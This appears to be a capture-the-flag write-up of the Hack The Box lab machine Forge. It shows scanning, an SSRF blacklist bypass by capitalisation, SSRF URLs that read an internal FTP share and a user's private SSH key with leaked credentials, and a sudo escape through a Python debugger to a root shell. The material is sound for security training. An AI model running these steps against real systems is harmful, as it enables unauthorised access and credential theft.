---
title: "[MEDIUM] HTB-Forge"
draft: false
tags:
  - htb
  - linux
  - ssrf
  - ssrf-bypass
  - sudo
  - pdb
---

![alt text](https://raw.githubusercontent.com/jadu101/jadu101.github.io/v4/Images/htb/forge/Forge.png)

**Forge** was Easy-Medium Linux machine. Initial foothold part could be little tricky if you are not familiar with SSRF. Through subdomain bruteforcing, I discovered **admin.forge.htb** and through SSRF, I can access it to read it. On **admin.forge.htb**, it noticed me of how to connect to FTP through SSRF and using that I was able to read id_rsa key from it. Using id_rsa, I spawned SSH connection as the user. Privilege Escalation was very simple, remote-management.py was open to any user to be ran as root. By inputting value to the script, the script spawns PDB as sudo, and through that I can get root shell. 

## Information Gathering
### Rustscan

Rustscan finds SSH and HTTP open:

```bash
┌──(yoon㉿kali)-[~/Documents/htb/forge]
└─$ rustscan --addresses 10.10.11.111 --range 1-65535
.----. .-. .-. .----..---.  .----. .---.   .--.  .-. .-.
| {}  }| { } |{ {__ {_   _}{ {__  /  ___} / {} \ |  `| |
| .-. \| {_} |.-._} } | |  .-._} }\     }/  /\  \| |\  |
`-' `-'`-----'`----'  `-'  `----'  `---' `-'  `-'`-' `-'
The Modern Day Port Scanner.
________________________________________
: https://discord.gg/GFrQsGy           :
: https://github.com/RustScan/RustScan :
 --------------------------------------
😵 https://admin.tryhackme.com
<snip>
Host is up, received syn-ack (0.40s latency).
Scanned at 2024-04-22 02:07:34 EDT for 0s

PORT   STATE SERVICE REASON
22/tcp open  ssh     syn-ack
80/tcp open  http    syn-ack

Read data files from: /usr/bin/../share/nmap
Nmap done: 1 IP address (1 host up) scanned in 0.92 seconds
```

### Nmap

Nmap finds nothing interesting:

```bash
┌──(yoon㉿kali)-[~/Documents/htb/forge]
└─$ sudo nmap -sVC -p 22,80 10.10.11.111   
Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-04-22 02:09 EDT
Nmap scan report for 10.10.11.111
Host is up (0.40s latency).

PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 4f:78:65:66:29:e4:87:6b:3c:cc:b4:3a:d2:57:20:ac (RSA)
|   256 79:df:3a:f1:fe:87:4a:57:b0:fd:4e:d0:54:c6:28:d9 (ECDSA)
|_  256 b0:58:11:40:6d:8c:bd:c5:72:aa:83:08:c5:51:fb:33 (ED25519)
80/tcp open  http    Apache httpd 2.4.41
|_http-title: Did not follow redirect to http://forge.htb
|_http-server-header: Apache/2.4.41 (Ubuntu)
Service Info: Host: 10.10.11.111; OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 21.29 seconds
```

## Enumeration
### HTTP - TCP 80

Going to the IP address throguh web browser, it leads me to **forge.htb** which I add to `/etc/hosts`:

![alt text](https://raw.githubusercontent.com/jadu101/jadu101.github.io/v4/Images/htb/forge/image.png)

Subdomain bruteforcing discovered one valid entry: **admin.forge.htb**:

`sudo gobuster vhost -u http://forge.htb --append-domain -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt`

![alt text](https://raw.githubusercontent.com/jadu101/jadu101.github.io/v4/Images/htb/forge/image-4.png)

After adding it to `/etc/hosts`, I can access it. However, it seems that only localhost is allowed for access:

`admin.forge.htb/`

![alt text](https://raw.githubusercontent.com/jadu101/jadu101.github.io/v4/Images/htb/forge/image-3.png)


**forge.htb** is some sort of gallery website:

![alt text](https://raw.githubusercontent.com/jadu101/jadu101.github.io/v4/Images/htb/forge/image-1.png)


Through `/upload`, I can choose to upload local file or to upload form URL:

![alt text](https://raw.githubusercontent.com/jadu101/jadu101.github.io/v4/Images/htb/forge/image-2.png)

After submiting random image from local directory, it shows the path where the image is saved:

![alt text](https://raw.githubusercontent.com/jadu101/jadu101.github.io/v4/Images/htb/forge/image-6.png)

Image successfully uploads as such:

![alt text](https://raw.githubusercontent.com/jadu101/jadu101.github.io/v4/Images/htb/forge/image-7.png)

Unfortunately, this web app won't read any php scripts. 

No matter what PHP script I upload, it won't render it properly. 

![alt text](https://raw.githubusercontent.com/jadu101/jadu101.github.io/v4/Images/htb/forge/image-8.png)

## SSRF

Moving on to **Upload from url**, I will try uploading file from my local Python HTTP server:

![alt text](https://raw.githubusercontent.com/jadu101/jadu101.github.io/v4/Images/htb/forge/image-11.png)

I see that the connection is made to my local listener from the web app:

![alt text](https://raw.githubusercontent.com/jadu101/jadu101.github.io/v4/Images/htb/forge/image-10.png)

Normally, I would upload PHP webshell to it and open it through `/uploads` and spawn a reverse shell through it but in this case, I know this webapp is not reading PHP.

Remembering **admin.forge.htb** is only accessible by localhost, I will try to access it through upload from url:

![alt text](https://raw.githubusercontent.com/jadu101/jadu101.github.io/v4/Images/htb/forge/image-12.png)

Unfortunately, there seems to be protection running here:

![alt text](https://raw.githubusercontent.com/jadu101/jadu101.github.io/v4/Images/htb/forge/image-13.png)

### Bypass SSRF Protection

I will try to bypass the blacklist through capitalization as such and it works:

![alt text](https://raw.githubusercontent.com/jadu101/jadu101.github.io/v4/Images/htb/forge/image-15.png)

Using **curl**, I can read **admin.forge.htb** in html:

![alt text](https://raw.githubusercontent.com/jadu101/jadu101.github.io/v4/Images/htb/forge/image-14.png)

Below is the full output for admin.forge.htb:

```html
<!DOCTYPE html>
<html>
<head>
    <title>Admin Portal</title>
</head>
<body>
    <link rel="stylesheet" type="text/css" href="/static/css/main.css">
    <header>
            <nav>
                <h1 class=""><a href="/">Portal home</a></h1>
                <h1 class="align-right margin-right"><a href="/announcements">Announcements</a></h1>
                <h1 class="align-right"><a href="/upload">Upload image</a></h1>
            </nav>
    </header>
    <br><br><br><br>
    <br><br><br><br>
    <center><h1>Welcome Admins!</h1></center>
</body>
</html>                            
```

Based on above's code, I will now try reading `/announcements`:

![alt text](https://raw.githubusercontent.com/jadu101/jadu101.github.io/v4/Images/htb/forge/image-17.png)

Using the same way, I can read `/announcements` in HTML:

![alt text](https://raw.githubusercontent.com/jadu101/jadu101.github.io/v4/Images/htb/forge/image-16.png)

Below is the full output:

```html
<!DOCTYPE html>
<html>
<head>
    <title>Announcements</title>
</head>
<body>
    <link rel="stylesheet" type="text/css" href="/static/css/main.css">
    <link rel="stylesheet" type="text/css" href="/static/css/announcements.css">
    <header>
            <nav>
                <h1 class=""><a href="/">Portal home</a></h1>
                <h1 class="align-right margin-right"><a href="/announcements">Announcements</a></h1>
                <h1 class="align-right"><a href="/upload">Upload image</a></h1>
            </nav>
    </header>
    <br><br><br>
    <ul>
        <li>An internal ftp server has been setup with credentials as user:heightofsecurity123!</li>
        <li>The /upload endpoint now supports ftp, ftps, http and https protocols for uploading from url.</li>
        <li>The /upload endpoint has been configured for easy scripting of uploads, and for uploading an image, one can simply pass a url with ?u=&lt;url&gt;.</li>
    </ul>
</body>
</html>            
```

`/announcements` reveals potentials credentials(user:heightofsecurity123!) as well as the way to access ftp through `/upload` paremeter:

![alt text](https://raw.githubusercontent.com/jadu101/jadu101.github.io/v4/Images/htb/forge/image-18.png)

Using the following url, I can access FTP:

`http://ADMIN.FORGE.HTB/upload?u=ftp://user:heightofsecurity123!@127.0.0.1/`

![alt text](https://raw.githubusercontent.com/jadu101/jadu101.github.io/v4/Images/htb/forge/image-19.png)

Since I can read contents inside the server through ftp, I will try reading **id_rsa** from `.ssh` and it works:


`http://ADMIN.FORGE.HTB/upload?u=ftp://user:heightofsecurity123!@127.0.1.1/.ssh/id_rsa`


![alt text](https://raw.githubusercontent.com/jadu101/jadu101.github.io/v4/Images/htb/forge/image-20.png)

After copying **id_rsa** in to a file name mykey to my local kali machine, now I have SSH access as **user**:

![alt text](https://raw.githubusercontent.com/jadu101/jadu101.github.io/v4/Images/htb/forge/image-21.png)

## Privesc: user to root
### Sudo Privilege Abuse

I will first check if there's anything I can run as the root with `sudo -l`:

![alt text](https://raw.githubusercontent.com/jadu101/jadu101.github.io/v4/Images/htb/forge/image-34.png)

`/opt/remote-manage.py` can be run as root using sudo.

Script can be seen in plain-text and password **secretadminpassword** is shown:

![alt text](https://raw.githubusercontent.com/jadu101/jadu101.github.io/v4/Images/htb/forge/image-26.png)

Below is the whole python code:

```python
#!/usr/bin/env python3
import socket
import random
import subprocess
import pdb

port = random.randint(1025, 65535)

try:
    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
    sock.bind(('127.0.0.1', port))
    sock.listen(1)
    print(f'Listening on localhost:{port}')
    (clientsock, addr) = sock.accept()
    clientsock.send(b'Enter the secret passsword: ')
    if clientsock.recv(1024).strip().decode() != 'secretadminpassword':
        clientsock.send(b'Wrong password!\n')
    else:
        clientsock.send(b'Welcome admin!\n')
        while True:
            clientsock.send(b'\nWhat do you wanna do: \n')
            clientsock.send(b'[1] View processes\n')
            clientsock.send(b'[2] View free memory\n')
            clientsock.send(b'[3] View listening sockets\n')
            clientsock.send(b'[4] Quit\n')
            option = int(clientsock.recv(1024).strip())
            if option == 1:
                clientsock.send(subprocess.getoutput('ps aux').encode())
            elif option == 2:
                clientsock.send(subprocess.getoutput('df').encode())
            elif option == 3:
                clientsock.send(subprocess.getoutput('ss -lnt').encode())
            elif option == 4:
                clientsock.send(b'Bye\n')
                break
except Exception as e:
    print(e)
    pdb.post_mortem(e.__traceback__)
finally:
    quit()
```

The script appears to be a simple server-side application that listens for incoming connections, prompts the client for a password, and then provides various options based on user input. 

Running the script will prompt you with what port is being used for listening:

![alt text](https://raw.githubusercontent.com/jadu101/jadu101.github.io/v4/Images/htb/forge/image-27.png)

I will use **nc** to connect to it and sign-in using the found password from earlier:

![alt text](https://raw.githubusercontent.com/jadu101/jadu101.github.io/v4/Images/htb/forge/image-28.png)

Choosing whatver option I want by typing in number will return me with the output after the command runs:

![alt text](https://raw.githubusercontent.com/jadu101/jadu101.github.io/v4/Images/htb/forge/image-29.png)

Now, I will run the script as the root using **sudo**:

![alt text](https://raw.githubusercontent.com/jadu101/jadu101.github.io/v4/Images/htb/forge/image-31.png)

I will connect the listening port and sign-in. I will try throwing in random value this time:

![alt text](https://raw.githubusercontent.com/jadu101/jadu101.github.io/v4/Images/htb/forge/image-32.png)

On the terminal where I ran the script, it shows an error and **PDB**(Python Debugger) shell is spawned.

After importing **os**, I can run commands as the root as such:

```bash
import os
os.system("/bin/sh")
```

![alt text](https://raw.githubusercontent.com/jadu101/jadu101.github.io/v4/Images/htb/forge/image-33.png)